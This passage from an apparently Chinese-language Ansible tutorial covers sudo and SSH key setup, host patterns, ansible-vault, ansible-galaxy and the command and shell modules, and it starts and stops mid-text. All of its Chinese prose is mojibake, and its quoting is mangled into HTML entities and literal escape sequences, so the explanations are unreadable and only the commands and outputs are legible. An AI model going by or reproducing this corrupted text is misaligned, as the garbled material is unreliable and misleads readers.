3\u0026#39; -f 10 èŒƒä¾‹ï¼šä½¿ç”¨æ™®é€šç”¨æˆ·è¿›è¡Œè¿œç¨‹ç®¡ç†\n# åœ¨æ‰€æœ‰æ§åˆ¶ç«¯å’Œè¢«æ§åˆ¶ç«¯åˆ›å»ºæ™®é€šè´¦å·å¹¶ä¿®æ”¹å¯†ç ï¼ˆæœ¬æ¬¡ç¤ºä¾‹ä¸ºå‡ä¸º192.168.0.133ï¼‰ [root@ansible ~]# useradd test [root@ansible ~]# echo test:test | chpasswd # æ·»åŠ sudoæˆæƒ [root@ansible ~]# visudo # æ·»åŠ ä¸€è¡Œ test\tALL=(ALL) ALL # æ ¡éªŒé…ç½®æ— è¯¯ [root@ansible ~]# visudo -c /etc/sudoers: parsed OK # åˆ‡æ¢åˆ°æ™®é€šç”¨æˆ· [root@ansible ~]# su - test # ç”Ÿæˆå¯†é’¥å¯¹ [test@ansible ~]$ ssh-keygen -f ~/.ssh/id_rsa -P \u0026#39; # å°†å…¬é’¥æ‹·è´åˆ°ç›®æ ‡ä¸»æœº [test@ansible ~] ssh-copy-id -o \u0026#34;StrictHostKeyChecking=no\u0026#34; test@192.168.0.133 # éªŒè¯å…å¯†ç™»å½•æˆåŠŸ [test@ansible ~]$ ssh test@192.168.0.133 Last login: Mon Jun 12 09:50:05 2023 # ä½¿ç”¨ansibleè¿›è¡Œè¿œç¨‹æ§åˆ¶ï¼Œæç¤ºæƒé™ä¸è¶³ [test@ansible ~]$ ansible 192.168.0.133 -m shell -a \u0026#39;ls /root/\u0026#39; 192.168.0.133 | FAILED | rc=2 \u0026gt;\u0026gt; ls: cannot open directory /root/: Permission deniednon-zero return code # ä½¿ç”¨ sudo ææƒåæ‰§è¡ŒæˆåŠŸ [test@ansible ~]$ ansible 192.168.0.133 -m shell -a \u0026#39;ls /root/\u0026#39; -b -K BECOME password: 192.168.0.133 | CHANGED | rc=0 \u0026gt;\u0026gt; ansible.cfg **æ³¨æ„ï¼š**åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œansible è¿œæ§æ—¶å¹¶æœªæŒ‡å®šè¿œç¨‹çš„ç”¨æˆ·åï¼Œå½“æ²¡æœ‰ç”¨ -u æŒ‡å®šè¿œç¨‹ç”¨æˆ·åæ—¶ï¼Œé»˜è®¤ä½¿ç”¨å½“å‰çš„æœ¬æœºç”¨æˆ·åè¿›è¡Œè¿œç¨‹\n[root@ansible ~]# ansible 192.168.0.133 -m shell -a \u0026#39;whoami\u0026#39; 192.168.0.133 | CHANGED | rc=0 \u0026gt;\u0026gt; root [root@ansible ~]# su - test Last login: Mon Jun 12 10:03:04 CST 2023 from 192.168.0.133 on pts/3 [test@ansible ~]$ ansible 192.168.0.133 -m shell -a \u0026#39;whoami\u0026#39; 192.168.0.133 | CHANGED | rc=0 \u0026gt;\u0026gt; test # é€šè¿‡ -u æ˜¾å¼æŒ‡æ˜è¿œç¨‹ç”¨æˆ·å [test@ansible ~]$ ansible 192.168.0.133 -m shell -a \u0026#39;whoami\u0026#39; -u root -k SSH password: 192.168.0.133 | CHANGED | rc=0 \u0026gt;\u0026gt; root ansible Host-pattern\nç”¨äºåŒ¹é…ä¸»æœºæ¸…å•ä¸­çš„ä¸»æœº\nå‡†å¤‡ä¸»æœºæ¸…å•æ–‡ä»¶ï¼š\n[root@ansible ~]# cat /etc/ansible/hosts 192.168.0.133 [hello] 192.168.0.1 172.31.5.1 [world] 10.0.0.1 172.31.5.1 all : å†…ç½®å˜é‡ï¼Œè¡¨ç¤ºæ‰€æœ‰ä¸»æœº\n[root@ansible ~]# ansible all --list-hosts hosts (4): 192.168.0.133 10.0.0.1 172.31.5.1 192.168.0.1 *: é€šé…ç¬¦\n[root@ansible ~]# ansible \u0026#34;*\u0026#34; --list-hosts hosts (4): 192.168.0.133 10.0.0.1 172.31.5.1 192.168.0.1 [root@ansible ~]# ansible \u0026#34;192.168.0.*\u0026#34; --list-hosts hosts (2): 192.168.0.1 192.168.0.133 é€»è¾‘æˆ–\n[root@ansible ~]# ansible \u0026#34;hello:world\u0026#34; --list-hosts hosts (3): 192.168.0.1 172.31.5.1 10.0.0.1 é€»è¾‘ä¸\n[root@ansible ~]# ansible \u0026#34;hello:\u0026amp;world\u0026#34; --list-hosts hosts (1): 172.31.5.1 é€»è¾‘é\n# å¼•ç”¨!å·æ—¶,ä¸è¦ç”¨åŒå¼•å·,è€Œä½¿ç”¨å•å¼•å· # åœ¨Ansibleä¸­ï¼Œå•å¼•å·ç”¨äºæŒ‡å®šå­—é¢å€¼æ¨¡å¼ï¼Œä»¥ç¡®ä¿å…¶ä¸­çš„å†…å®¹è¢«è§†ä¸ºæ™®é€šå­—ç¬¦ï¼Œè€Œä¸è¿›è¡Œå˜é‡å±•å¼€æˆ–è½¬ä¹‰å­—ç¬¦å¤„ç†ã€‚ [root@ansible ~]# ansible \u0026#39;all:!hello:!world\u0026#39; --list-hosts hosts (1): 192.168.0.133 æ­£åˆ™è¡¨è¾¾å¼\nansible \u0026#34;~(web|db).*\\.test\\.com\u0026#34; -m ping \u0026quot;~(web|db).*\\.test\\.com\u0026quot;æ˜¯ç”¨äºé€‰æ‹©ç›®æ ‡ä¸»æœºçš„æ¨¡å¼ï¼ˆpatternï¼‰ã€‚è®©æˆ‘ä»¬é€æ­¥è§£é‡Šè¿™ä¸ªæ¨¡å¼ï¼š\n~æ˜¯Ansibleä¸­ç”¨äºåŒ¹é…æ­£åˆ™è¡¨è¾¾å¼çš„è¿ç®—ç¬¦ã€‚ (web|db)è¡¨ç¤ºé€‰æ‹©ä»¥\u0026quot;web\u0026quot;æˆ–\u0026quot;db\u0026quot;å¼€å¤´çš„å­—ç¬¦ä¸²ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ¨¡å¼å°†åŒ¹é…\u0026quot;web\u0026quot;æˆ–\u0026quot;db\u0026quot;ä¹‹åçš„ä»»æ„å­—ç¬¦ã€‚ .*è¡¨ç¤ºåŒ¹é…é›¶ä¸ªæˆ–å¤šä¸ªä»»æ„å­—ç¬¦ã€‚ \\.test\\.comè¡¨ç¤ºåŒ¹é…å­—ç¬¦ä¸²\u0026quot;.test.com\u0026quot;ã€‚ å› æ­¤ï¼Œæ•´ä¸ªæ¨¡å¼~(web|db).*\\.test\\.comå°†åŒ¹é…ä»¥\u0026quot;web\u0026quot;æˆ–\u0026quot;db\u0026quot;å¼€å¤´ï¼Œç„¶åæ˜¯ä»»æ„å­—ç¬¦ï¼ˆé›¶ä¸ªæˆ–å¤šä¸ªï¼‰ï¼Œæœ€åä»¥\u0026quot;.test.com\u0026quot;ç»“å°¾çš„å­—ç¬¦ä¸²ã€‚\nä½¿ç”¨è¯¥æ¨¡å¼ï¼Œansibleå‘½ä»¤å°†é€‰æ‹©ç¬¦åˆè¯¥æ¨¡å¼çš„è¿œç¨‹ä¸»æœºï¼Œå¹¶å¯¹å®ƒä»¬æ‰§è¡ŒPingæ“ä½œã€‚Pingæ“ä½œæ—¨åœ¨æ£€æŸ¥ä¸ç›®æ ‡ä¸»æœºçš„è¿é€šæ€§ï¼Œå¹¶ç¡®å®šæ˜¯å¦å¯ä»¥ä¸ä¹‹é€šä¿¡ã€‚\nç»¼ä¸Šæ‰€è¿°ï¼Œansible \u0026quot;~(web|db).*\\.test\\.com\u0026quot; -m pingå‘½ä»¤å°†ä½¿ç”¨Ansibleé€‰æ‹©ä»¥\u0026quot;web\u0026quot;æˆ–\u0026quot;db\u0026quot;å¼€å¤´ï¼Œç„¶åæ˜¯ä»»æ„å­—ç¬¦ï¼Œæœ€åä»¥\u0026quot;.test.com\u0026quot;ç»“å°¾çš„ä¸»æœºï¼Œå¹¶å¯¹å®ƒä»¬æ‰§è¡ŒPingæ“ä½œã€‚\n2.3.2.3 Ansible å‘½ä»¤æ‰§è¡Œè¿‡ç¨‹ åŠ è½½é…ç½®æ–‡ä»¶ï¼Œé»˜è®¤ä¸º /etc/ansible/ansible.cfg åŒ¹é…ä¸»æœºæ¸…å•ä¸­å¯¹åº”çš„ä¸»æœºæˆ–è€…ä¸»æœºç»„ åŠ è½½å¯¹åº”çš„æ¨¡å—æ–‡ä»¶ï¼Œå¦‚ï¼šshell é€šè¿‡ ansible å°†æ¨¡å—æˆ–å‘½ä»¤ç”Ÿæˆä¸´æ—¶ py æ–‡ä»¶ï¼Œå¹¶å°†è¯¥æ–‡ä»¶ä¼ è¾“è‡³å—æ§èŠ‚ç‚¹ï¼š$HOME/.ansible/tmp/ansible-tmp-æ•°å­—/XXX.PYæ–‡ä»¶ èµ‹äºˆ xxx.py æ–‡ä»¶æ‰§è¡Œæƒé™ï¼š+x æ‰§è¡Œå¹¶è¿”å›ç»“æœ åˆ é™¤ xxx.py æ–‡ä»¶ï¼Œç»“æŸ 2.3.2.4 Ansible å‘½ä»¤æ‰§è¡ŒçŠ¶æ€ æ¯ç§çŠ¶æ€å¯¹åº”äº†ä¸€ä¸ªé¢œè‰²æ ‡è¯†\n[root@ansible ~]# grep -A 14 \u0026#39;\\[colors\\]\u0026#39; /etc/ansible/ansible.cfg [colors] #highlight = white #verbose = blue #warn = bright purple #error = red #debug = dark gray #deprecate = purple #skip = cyan #unreachable = red #ok = green #changed = yellow #diff_add = green #diff_remove = red #diff_lines = cyan å¸¸è§çš„ä¸‰ç§é¢œè‰²æ ‡è¯†ï¼š\nç»¿è‰²ï¼šè¡¨ç¤ºä»»åŠ¡æˆåŠŸå®Œæˆã€‚å½“ä»»åŠ¡åœ¨è¿œç¨‹ä¸»æœºä¸ŠæˆåŠŸæ‰§è¡Œå¹¶è¿”å›æ­£ç¡®çš„ç»“æœæ—¶ï¼Œè¯¥ä»»åŠ¡å°†ä»¥ç»¿è‰²æ˜¾ç¤ºã€‚\n**é»„è‰²ï¼š**è¡¨ç¤ºä»»åŠ¡å·²æ›´æ”¹ã€‚å½“ä»»åŠ¡åœ¨è¿œç¨‹ä¸»æœºä¸Šæ‰§è¡Œå¹¶å¯¼è‡´ä¸€äº›æ›´æ”¹æ—¶ï¼Œä½†ä¸ä¼šç ´åç³»ç»Ÿæˆ–å¼•å‘é”™è¯¯æ—¶ï¼Œè¯¥ä»»åŠ¡å°†ä»¥é»„è‰²æ˜¾ç¤ºã€‚ä¾‹å¦‚ï¼Œå¦‚æœæŸä¸ªé…ç½®æ–‡ä»¶çš„æŸè¡Œå·²æ›´æ”¹ï¼Œä½†è¯¥æ›´æ”¹ä¸ä¼šå¯¼è‡´é—®é¢˜æˆ–é”™è¯¯ï¼Œä»»åŠ¡çŠ¶æ€å°†æ˜¾ç¤ºä¸ºé»„è‰²ã€‚\n**çº¢è‰²ï¼š**è¡¨ç¤ºä»»åŠ¡å¤±è´¥ã€‚å½“ä»»åŠ¡åœ¨è¿œç¨‹ä¸»æœºä¸Šæ‰§è¡Œæ—¶å‘ç”Ÿé”™è¯¯æˆ–è¿”å›é”™è¯¯ç»“æœæ—¶ï¼Œè¯¥ä»»åŠ¡å°†ä»¥çº¢è‰²æ˜¾ç¤ºã€‚è¿™å¯èƒ½æ˜¯ç”±äºè¿æ¥é—®é¢˜ã€æƒé™é—®é¢˜ã€è¯­æ³•é”™è¯¯æˆ–å…¶ä»–åŸå› å¯¼è‡´çš„å¤±è´¥ã€‚\n2.3.3 ansible-console æ­¤å·¥å…·ä¸»è¦ç”¨äºäº¤äº’å¼æ‰§è¡Œå‘½ä»¤ï¼Œæ”¯æŒå‘½ä»¤è¡¥å…¨ï¼Œansible 2.0+ ç‰ˆæœ¬æ–°å¢\næç¤ºç¬¦æ ¼å¼ï¼š\nè¿œç¨‹ç”¨æˆ·@ç›®æ ‡ä¸»æœºç»„ï¼ˆç»„ä¸­çš„ä¸»æœºæ•°é‡ï¼‰[f:å¹¶å‘æ•°]$ å¸¸ç”¨å‘½ä»¤ï¼š\nè®¾ç½®å¹¶å‘æ•°ï¼šforks åˆ‡æ¢ç»„ï¼šcd [group_name]\næŸ¥çœ‹å½“å‰ç»„ä¸­çš„ä¸»æœºï¼šlist\næŸ¥çœ‹æ‰€æœ‰çš„å†…ç½®å‘½ä»¤ï¼šï¼Ÿæˆ– help\né€€å‡ºï¼šexit æˆ–è€… Ctrl+ D\nç¤ºä¾‹ï¼š\n[root@ansible ~]# ansible-console Welcome to the ansible console. Type help or ? to list commands. root@all (4)[f:5]$ forks 6 root@all (4)[f:6]$ cd hello root@hello (2)[f:6]$ exit 2.3.4 ansible-playbook æ­¤å·¥å…·ä¸»è¦ç”¨äºæ‰§è¡Œç¼–å†™å¥½çš„ playbook ä»»åŠ¡\nèŒƒä¾‹ï¼š\n[root@ansible playbooks]# cat hello.yaml # playbook ä»»åŠ¡ï¼Œæ‰“å° hello world - hosts: localhost remote_user: root gather_facts: no tasks: - name: hello world shell: wall \u0026#34;hello world\u0026#34; # å‘æ‰€æœ‰å·²ç™»å½•ç”¨æˆ·å¹¿æ’­æ¶ˆæ¯ [root@ansible playbooks]# ansible-playbook hello.yaml # æ‰§è¡Œ playbook ä»»åŠ¡ PLAY [localhost] *************************************************************************************************************************************** TASK [hello world] ************************************************************************************************************************************* Broadcast message from root@ansible.localdomain (Mon Jun 19 09:15:36 2023): hello world changed: [localhost] PLAY RECAP ********************************************************************************************************************************************* localhost : ok=1 changed=1 unreachable=0 failed=0 skipped=0 rescued=0 ignored=0 2.3.5 ansible-vault æ­¤å·¥å…·ç”¨äºåŠ å¯†ï¼Œè§£å¯† yaml æ–‡ä»¶\næ ¼å¼ï¼š\nansible-vault [create,decrypt,edit,view,encrypt,encrypt_string,rekey] \u0026lt;*.yaml\u0026gt; èŒƒä¾‹ï¼š\n[root@ansible playbooks]# ansible-vault encrypt hello.yaml # åŠ å¯†æ–‡ä»¶ New Vault password: Confirm New Vault password: Encryption successful [root@ansible playbooks]# ansible-vault view hello.yaml # æŸ¥çœ‹åŠ å¯†æ–‡ä»¶å†…å®¹ï¼Œéœ€è¦è¾“å…¥æ­£ç¡®çš„å¯†ç  Vault password: - hosts: localhost remote_user: root gather_facts: no tasks: - name: hello world shell: wall \u0026#34;hello world\u0026#34; [root@ansible playbooks]# cat hello.yaml # æ­£å¸¸æŸ¥çœ‹ï¼Œåªèƒ½çœ‹åˆ°å¯†æ–‡ $ANSIBLE_VAULT;1.1;AES256 62623561653235343235613763393365396164323430366161363731646339303965316136333964 6662366334363161363465636630646532616334666538640a383037313035646537613264306130 62323438653861613736336339353037373537633066396566366136373832666332636364336362 6130363834346566630a343765303630616631643436373036353966356663366537343863653535 65653565653765363961313738386266336538353336376664643330316633303636333337336237 35653162313461383436643237623034363436373430363237346334663062306638386566313738 36346165643437643230396664346564383039623434346332313961303331383331313761663939 63313665306463356433393731663965366131353336666135343530613062306433623234623666 39633764623862353238613139333264343735303330626432363831646331653666313361316565 3034363863323531393761316363626263653838313734343134 [root@ansible playbooks]# ansible-playbook hello.yaml # ä¸èƒ½ç›´æ¥æ‰§è¡Œå·²åŠ å¯†çš„ playbook ERROR! Attempting to decrypt but no vault secrets found [root@ansible playbooks]# ansible-playbook --ask-vault-pass hello.yaml # åŠ å…¥é€‰é¡¹ï¼Œè¾“å…¥å¯†ç åæ‰§è¡Œ [root@ansible playbooks]# cat pass.txt # å‡†å¤‡å¯†ç æ–‡ä»¶ï¼Œå­˜æ”¾å¯†ç  dd [root@ansible playbooks]# ansible-playbook --vault-password-file pass.txt hello.yaml # ä»æ–‡ä»¶ä¸­è¯»å–å¯†ç  [root@ansible playbooks]# grep vault_password_file /etc/ansible/ansible.cfg # ä¿®æ”¹é…ç½®æ–‡ä»¶ä¸­çš„è¯¥é¡¹ï¼ŒæŒ‡å®šå¯†ç æ–‡ä»¶è·¯å¾„ vault_password_file = /etc/ansible/pass.txt [root@ansible playbooks]# ansible-playbook hello.yaml # å¯ä»¥æ­£å¸¸æ‰§è¡Œ playbook [root@ansible playbooks]# ansible-vault edit hello.yaml # ç¼–è¾‘åŠ å¯†æ–‡ä»¶ï¼Œéœ€è¦è¾“å…¥æ­£ç¡®çš„å¯†ç  Vault password: [root@ansible playbooks]# ansible-vault decrypt hello.yaml # è§£å¯†æ–‡ä»¶ Vault password: Decryption successful [root@ansible playbooks]# cat hello.yaml # å¯ä»¥çœ‹åˆ°æœªåŠ å¯†çš„åŸæ–‡ - hosts: localhost remote_user: root gather_facts: no tasks: - name: hello world shell: wall \u0026#34;hello world +++\u0026#34; [root@ansible playbooks]# ansible-vault create new.yaml # å¯ä»¥ç›´æ¥åˆ›å»ºä¸€ä¸ªåŠ å¯†æ–‡ä»¶ New Vault password: Confirm New Vault password: [root@ansible playbooks]# ansible-vault rekey new.yaml # è¾“å…¥æ—§å¯†ç åï¼Œå¯ä»¥æ›´æ”¹å¯†ç  Vault password: New Vault password: Confirm New Vault password: Rekey successful 2.3.6 ansible-galaxy Galaxy æ˜¯ä¸€ä¸ªå…è´¹ç½‘ç«™, ç±»ä¼¼äºgithubç½‘ç«™, ç½‘ç«™ä¸Šå‘å¸ƒäº†å¾ˆå¤šçš„å…±äº«çš„rolesè§’è‰²ã€‚\nAnsible æä¾›äº†ansible-galaxyå‘½ä»¤è¡Œå·¥å…·è¿æ¥ https://galaxy.ansible.com ç½‘ç«™ä¸‹è½½ç›¸åº”çš„rolesï¼Œè¿›è¡Œ\ninit (åˆå§‹åŒ–)ã€search ( æŸ¥æ‹˜)ã€install (å®‰è£…)ã€ remove(ç§»é™¤)ç­‰æ“ä½œã€‚\nansible-galaxyæ˜¯ä¸€ä¸ªä¸Ansibleé…ç½®ç®¡ç†å·¥å…·ç›¸å…³çš„å‘½ä»¤è¡Œå·¥å…·ã€‚å®ƒç”¨äºç®¡ç†å’Œæ‰©å±•Ansibleè§’è‰²å’Œé›†åˆã€‚\nä½¿ç”¨ansible-galaxyï¼Œå¯ä»¥æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š\nå®‰è£…è§’è‰²å’Œé›†åˆï¼šå¯ä»¥ä½¿ç”¨ansible-galaxy installå‘½ä»¤å®‰è£…å…¶ä»–äººç¼–å†™çš„Ansibleè§’è‰²æˆ–é›†åˆã€‚ä¾‹å¦‚ï¼Œè¦å®‰è£…ä¸€ä¸ªåä¸ºmyroleçš„è§’è‰²ï¼Œå¯ä»¥è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼ˆé»˜è®¤ä¸‹è½½åˆ°~/.ansible/rolesä¸‹ï¼‰ï¼š\nansible-galaxy install myrole åˆ›å»ºè§’è‰²ï¼šä½¿ç”¨ansible-galaxy initå‘½ä»¤å¯ä»¥åˆ›å»ºä¸€ä¸ªæ–°çš„Ansibleè§’è‰²ç»“æ„ã€‚è¯¥å‘½ä»¤å°†ç”Ÿæˆä¸€ä¸ªåŒ…å«ç›®å½•å’Œæ–‡ä»¶çš„ç›®å½•ç»“æ„ï¼Œç”¨äºç»„ç»‡è§’è‰²çš„ä»»åŠ¡ã€å˜é‡ã€æ¨¡æ¿ç­‰å†…å®¹ã€‚ä¾‹å¦‚ï¼Œè¦åˆ›å»ºä¸€ä¸ªåä¸ºmyroleçš„è§’è‰²ï¼Œå¯ä»¥è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š\nansible-galaxy init myrole åˆ—å‡ºå·²å®‰è£…çš„è§’è‰²å’Œé›†åˆï¼šä½¿ç”¨ansible-galaxy listå‘½ä»¤å¯ä»¥åˆ—å‡ºå·²ç»å®‰è£…åœ¨ç³»ç»Ÿä¸Šçš„è§’è‰²å’Œé›†åˆã€‚è¿™å°†æ˜¾ç¤ºå·²å®‰è£…çš„è§’è‰²å’Œé›†åˆçš„åç§°ã€ç‰ˆæœ¬å·å’Œå…¶ä»–è¯¦ç»†ä¿¡æ¯ã€‚\nåˆ é™¤è§’è‰²å’Œé›†åˆï¼šå¯ä»¥ä½¿ç”¨ansible-galaxy removeå‘½ä»¤ä»ç³»ç»Ÿä¸­åˆ é™¤å·²å®‰è£…çš„è§’è‰²å’Œé›†åˆã€‚ä¾‹å¦‚ï¼Œè¦åˆ é™¤ä¸€ä¸ªåä¸ºmyroleçš„è§’è‰²ï¼Œå¯ä»¥è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š\nansible-galaxy remove myrole è¿™äº›åªæ˜¯ansible-galaxyå‘½ä»¤çš„ä¸€äº›å¸¸è§ç”¨æ³•ç¤ºä¾‹ã€‚æœ‰å…³æ›´å¤šè¯¦ç»†ä¿¡æ¯å’Œé€‰é¡¹ï¼Œè¯·æŸ¥é˜…Ansibleå®˜æ–¹æ–‡æ¡£æˆ–è¿è¡Œansible-galaxy --helpå‘½ä»¤æ¥è·å–å¸®åŠ©ã€‚\n2.4 Ansible å¸¸ç”¨æ¨¡å— 2015å¹´12æœˆåª270å¤šä¸ªæ¨¡å—\n2016å¹´12å¹´26æ—¥ansible 1.9.2 æœ‰540ä¸ªæ¨¡å—\n2018å¹´01æœˆ12æ—¥ansible 2.3.8 æœ‰1378ä¸ªæ¨¡å—\n2018å¹´05æœˆ28æ—¥ansible 2.5.3 æœ‰1562ä¸ªæ¨¡å—\n2018å¹´07æœˆ15æ—¥ansible 2.6.3 æœ‰1852ä¸ªæ¨¡å—\n2018å¹´11æœˆ19æ—¥ansible 2.7.2 æœ‰2080ä¸ªæ¨¡å—\n2020å¹´03æœˆ02æ—¥ansible 2.9.5 æœ‰3387ä¸ªæ¨¡å—\n2021å¹´12æœˆ22æ—¥ansible 2.11.8 æœ‰6141ä¸ªæ¨¡å—\n2022å¹´06æœˆ04æ—¥ansible 2.12.6 æœ‰6763ä¸ªæ¨¡å—\nè™½ç„¶æ¨¡å—ä¼—å¤šï¼Œä½†æœ€å¸¸ç”¨çš„æ¨¡å—çº¦30ä¸ªå·¦å³ï¼Œé’ˆå¯¹ç‰¹å®šä¸šåŠ¡å­¦ä¹ éœ€è¦çš„æ¨¡å—å³å¯\nå¸¸ç”¨æ¨¡å—å¸®åŠ©æ–‡æ¡£å‚è€ƒï¼š\nModule Index â€” Ansible Documentation\nAll modules â€” Ansible Documentation\næœ¬ç« èŠ‚å†…å®¹ä»¥æ­¤ä¸»æœºæ¸…å•è¿›è¡Œæ¼”ç¤ºï¼Œansible ä¸ºç®¡ç†èŠ‚ç‚¹ï¼Œremote ä¸ºå—æ§èŠ‚ç‚¹\n[root@ansible ~]# hostname -I 192.168.0.133 [root@ansible ~]# cat /etc/ansible/hosts remote ansible_ssh_host=192.168.0.134 remote2 ansible_ssh_host=192.168.0.135 2.4.1 command æ¨¡å— é»˜è®¤æ¨¡å—ã€‚åœ¨è¿œç¨‹ä¸»æœºæ‰§è¡Œå‘½ä»¤ï¼Œæ‰§è¡Œå‘½ä»¤æ—¶ä¸åŠ  -m åˆ™é»˜è®¤ä½¿ç”¨æ­¤æ¨¡å—\næ­¤å‘½ä»¤ä¸æ”¯æŒ \u0026lt;, \u0026gt;, |, ; and \u0026amp; ç­‰é«˜çº§ç‰¹æ€§æˆ–è¿ç®—ç¬¦\næ­¤æ¨¡å—ä¸å…·å¤‡å¹‚ç­‰æ€§\nå¸¸ç”¨é€‰é¡¹ï¼š\nchdir=DIR\t# åˆ‡æ¢ç›®å½• creates=FILE\t# å½“ FILE ä¸å­˜åœ¨æ—¶ï¼Œæ‰§è¡Œæ“ä½œ removes=FILE\t# å½“ FILE å­˜åœ¨æ—¶ï¼Œæ‰§è¡Œæ“ä½œ\tèŒƒä¾‹ï¼š\n# åˆ‡æ¢ç›®å½•ï¼ŒæŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬ [root@ansible ~]# ansible localhost -a \u0026#39;chdir=/etc cat centos-release\u0026#39; localhost | CHANGED | rc=0 \u0026gt;\u0026gt; CentOS Linux release 7.6.1810 (Core) # å½“ /tmp/tmp.txt å­˜åœ¨æ—¶ï¼Œæ‰“å° hello [root@ansible ~]# ansible localhost -a \u0026#39;chdir=/etc creates=/tmp/tmp.txt echo hello\u0026#39; localhost | CHANGED | rc=0 \u0026gt;\u0026gt; hello # å½“ /tmp/tmp.txt å­˜åœ¨æ—¶ï¼Œæ‰“å° hellï¼Œè¿™é‡Œæ¡ä»¶ä¸æ»¡è¶³ï¼Œä»»åŠ¡ç›´æ¥è¢«è·³è¿‡ [root@ansible ~]# ansible localhost -a \u0026#39;chdir=/etc removes=/tmp/tmp.txt echo hello\u0026#39; localhost | SUCCESS | rc=0 \u0026gt;\u0026gt; skipped, since /tmp/tmp.txt does not exist ä¸æ”¯æŒçš„é«˜çº§ç‰¹æ€§ï¼š\n# åˆ›å»º hello.txt, å‘½ä»¤æ‰§è¡ŒæˆåŠŸ [root@ansible ~]# ansible localhost -a \u0026#39;chdir=/tmp echo hello \u0026gt; hello.txt\u0026#39; localhost | CHANGED | rc=0 \u0026gt;\u0026gt; hello \u0026gt; hello.txt # å®é™…ä¸Šæ–‡ä»¶å¹¶ä¸å­˜åœ¨ [root@ansible ~]# ansible localhost -a \u0026#39;chdir=/tmp ll hello.txt\u0026#39; localhost | FAILED | rc=2 \u0026gt;\u0026gt; [Errno 2] No such file or directory [root@ansible ~]# ll /tmp/hello.txt ls: cannot access /tmp/hello.txt: No such file or directory # ä¸æ”¯æŒ \u0026amp;\u0026amp; ; | ç­‰ç¬¦å·ï¼ˆå°½ç®¡æ‰§è¡Œä¸æŠ¥é”™ï¼‰ [root@ansible ~]# ansible localhost -a \u0026#39;chdir=/tmp echo hello \u0026gt; hello.txt \u0026amp;\u0026amp; echo world\u0026#39; localhost | CHANGED | rc=0 \u0026gt;\u0026gt; hello \u0026gt; hello.txt \u0026amp;\u0026amp; echo world [root@ansible ~]# ansible localhost -a \u0026#39;chdir=/tmp echo hello \u0026gt; hello.txt ; echo world\u0026#39; localhost | CHANGED | rc=0 \u0026gt;\u0026gt; hello \u0026gt; hello.txt ; echo world [root@ansible ~]# ansible localhost -m command -a \u0026#34;echo test | passwd --stdin pass\u0026#34; localhost | CHANGED | rc=0 \u0026gt;\u0026gt; test | passwd --stdin pass 2.4.2 shell æ¨¡å— æ­¤æ¨¡å—åŠŸèƒ½ä¸ command å‡ ä¹ä¸€è‡´ï¼Œä½†æ˜¯åŠŸèƒ½ä¼šæ›´å¼ºã€‚Command æ¨¡å—ä¸æ”¯æŒçš„é‡å®šå‘ï¼Œç®¡é“ç¬¦ç­‰è¿ç®—ç¬¦åœ¨ Shell æ¨¡å—ä¸­éƒ½æ˜¯æ”¯æŒçš„ï¼ˆå°½ç®¡å¦‚æ­¤ï¼Œå®é™…ä½¿ç”¨æ—¶å°½é‡é¿å…ä½¿ç”¨è¿‡äºå¤æ‚æˆ–ç‰¹æ®Šçš„ç¬¦å·ï¼‰ï¼Œé™¤éæœ‰ä½¿ç”¨é«˜çº§ç‰¹æ€§çš„éœ€æ±‚ï¼Œå¦åˆ™å®˜æ–¹æ›´æ¨èä½¿ç”¨ command æ¨¡å—ï¼ˆæ›´åŠ å®‰å…¨å’Œç¨³å®šï¼‰ã€‚\næ­¤æ¨¡å—ä¸å…·å¤‡å¹‚ç­‰æ€§\nå¸¸è§é€‰é¡¹\nchdir=DIR\t# åˆ‡æ¢ç›®å½• creates=FILE\t# å½“ FILE ä¸å­˜åœ¨æ—¶ï¼Œæ‰§è¡Œæ“ä½œ removes=FILE\t# å½“ FILE å­˜åœ¨æ—¶ï¼Œæ‰§è¡Œæ“ä½œ èŒƒä¾‹ï¼š\n# æ‰“å°å˜é‡ [root@ansible ~]# ansible localhost -m shell -a \u0026#34;echo $HOSTNAME\u0026#34; localhost | CHANGED | rc=0 \u0026gt;\u0026gt; localhost.localdomain # ä¿®æ”¹è´¦å·å¯†ç  [root@ansible ~]# ansible localhost -m shell -a \u0026#34;echo pass | passwd --stdin test\u0026#34; localhost | CHANGED | rc=0 \u0026gt;\u0026gt; Changing password for user test. passwd: all authentication tokens updated successfully. # ä½¿ç”¨é‡å®šå‘ç”Ÿæˆæ–‡ä»¶ï¼Œå¹¶è¾“å‡ºå†…å®¹ [root@ansible ~]# ansible localhost -m shell -a \u0026#34;echo hello \u0026gt; /tmp/hello.txt \u0026amp;\u0026amp; ls /tmp/hello.txt \u0026amp;\u0026amp; cat /tmp/hello.txt\u0026#34; localhost | CHANGED | rc=0 \u0026gt;\u0026gt; /tmp/hello.txt hello æ³¨æ„ï¼šç±»ä¼¼ cat /tmp/test.md | awk -F\u0026rsquo;|\u0026rsquo; \u0026lsquo;{print $1,$2}\u0026rsquo; \u0026amp;\u0026gt; /tmp/example.txt çš„å¤æ‚å‘½ä»¤ï¼Œå³ä½¿ä½¿ç”¨Shellæ¨¡å—ä¹Ÿå¯èƒ½ä¼šå¤±è´¥ã€‚å¯ä»¥è€ƒè™‘å°†å‘½ä»¤å†™æˆ shell è„šæœ¬ï¼Œå†é€šè¿‡ Script æ¨¡å—è¿›è¡Œè°ƒç”¨\nAnsible å‘½ä»¤æ‰€ä½¿ç”¨çš„é»˜è®¤æ¨¡å—æ˜¯ commandï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹é…ç½®é¡¹é‡æ–°æŒ‡å®šä¸ºåˆ«çš„æ¨¡å—ï¼š\n[root@ansible ~]# grep module_name /etc/ansible/ansible.cfg #module_name = command 2.4.3 script æ¨¡å— æ­¤æ¨¡å—å¯ä»¥åœ¨è¿œç¨‹ä¸»æœºæ‰§è¡Œ Ansible ä¸»æœºä¸Šçš„è„šæœ¬ï¼ˆè„šæœ¬ä¸éœ€è¦æ‰§è¡Œæƒé™ï¼‰\næ­¤æ¨¡å—ä¸å…·å¤‡å¹‚ç­‰æ€§\nå¸¸è§é€‰é¡¹\nchdir=DIR\t# åˆ‡æ¢ç›®å½• creates=FILE\t# å½“ FILE ä¸å­˜åœ¨æ—¶ï¼Œæ‰§è¡Œæ“ä½œ removes=FILE\t# 